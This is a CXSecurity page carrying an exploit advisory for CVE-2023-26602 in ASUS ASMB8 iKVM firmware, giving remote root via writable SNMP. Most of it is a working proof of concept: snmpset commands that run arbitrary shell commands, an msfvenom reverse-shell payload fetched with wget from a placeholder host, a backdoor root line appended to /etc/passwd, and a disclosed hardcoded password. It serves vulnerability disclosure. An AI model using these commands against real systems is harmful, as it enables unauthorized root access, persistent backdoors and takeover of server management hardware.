---
title: ASUS ASMB8 iKVM 1.14.51 SNMP Remote Root
url: https://cxsecurity.com/issue/WLB-2023020047
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-28
fetch_date: 2025-10-04T08:12:12.815752
---

# ASUS ASMB8 iKVM 1.14.51 SNMP Remote Root

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ASUS ASMB8 iKVM 1.14.51 SNMP Remote Root** **2023.02.27**  Credit:  **[d1g](https://cxsecurity.com/author/d1g/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-26602](https://cxsecurity.com/cveshow/CVE-2023-26602/ "Click to see CVE-2023-26602")**  CWE: **N/A** | |

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# Exploit Title: ASUS ASMB8 iKVM RCE and SSH Root Access
# Date: 2023-02-16
# Exploit Author: d1g@segfault.net for NetworkSEC [NWSSA-002-2023]
# Vendor Homepage: https://servers.asus.com/search?q=ASMB8
# Version/Model: ASMB8 iKVM Firmware <= 1.14.51 (probably others)
# Tested on: Linux AMI2CFDA1C7570E 2.6.28.10-ami armv5tejl
# CVE: CVE-2023-26602
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++
0x00 DESCRIPTION
++++++++++++++++++++
During a recent engagement, a remote server management interface has been
discovered. Furthermore, SNMPv2 was found to be enabled, offering write
access to the private community, subsequently allowing us to introduce
SNMP arbitrary extensions to achieve RCE.
We also found a hardcoded account sysadmin:superuser by cracking the
shadow file (md5crypt) found on the system and identifed an "anonymous"
user w/ the same password, however a lock seems to be in place to prevent
using these credentials via SSH (running defshell as default shell).
+++++++++++++++
0x01 IMPACT
+++++++++++++++
By exploiting SNMP arbitrary extension, we are able to run any command on
the system w/ root privileges, and we are able to introduce our own user
circumventing the defshell restriction for SSH.
+++++++++++++++++++++++++++++++
0x02 PROOF OF CONCEPT (PoC)
+++++++++++++++++++++++++++++++
At first, we have to create required extensions on the system, e.g. via
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "[command]"'
and if everything is set, we can just run that command by
snmpbulkwalk -c public -v2c x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects
which will execute our defined command and show us its output.
+++++++++++++++++++++++++++++++
0x03 SSH Remote Root Access
+++++++++++++++++++++++++++++++
The identified RCE can be used to transfer a reverse tcp shell created
by msfvenom for arm little-endian, e.g.
msfvenom -p linux/armle/shell\_reverse\_tcp LHOST=x.x.x.x LPORT=4444 -f elf -o rt.bin
We can now transfer the binary, adjust permissions and finally run it:
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "wget -O /var/tmp/rt.bin http://x.x.x.x/rt.bin"'
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "chmod +x /var/tmp/rt.bin"'
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "/var/tmp/rt.bin"'
Again, we have to request execution of the lines in the MIB via:
snmpbulkwalk -c public -v2c x.x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects
We get a reverse connection from the host, and can now act on the local system
to easily echo our own line into /etc/passwd:
echo d1g:OmE2EUpLJafIk:0:0:root:/root:/bin/sh >> /etc/passwd
By setting the standard shell to /bin/sh, we are able to get a SSH root
shell into the system, effectively circumventing the defshell restriction.
$ sshpass -p xxxx ssh x.x.x.x -oHostKeyAlgorithms=+ssh-dss -l d1g
BusyBox v1.13.2 (2017-07-11 18:39:07 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.
# uname -a
Linux AMI2CFDA1C7570E 2.6.28.10-ami #1 Tue Jul 11 18:49:20 CST 2017 armv5tejl unknown
# uptime
15:01:45 up 379 days, 23:33, load average: 2.63, 1.57, 1.25
# head -n 1 /etc/shadow
sysadmin:$1$A17c6z5w$5OsdHjBn1pjvN6xXKDckq0:14386:0:99999:7:::
---
#EOF

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020047)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top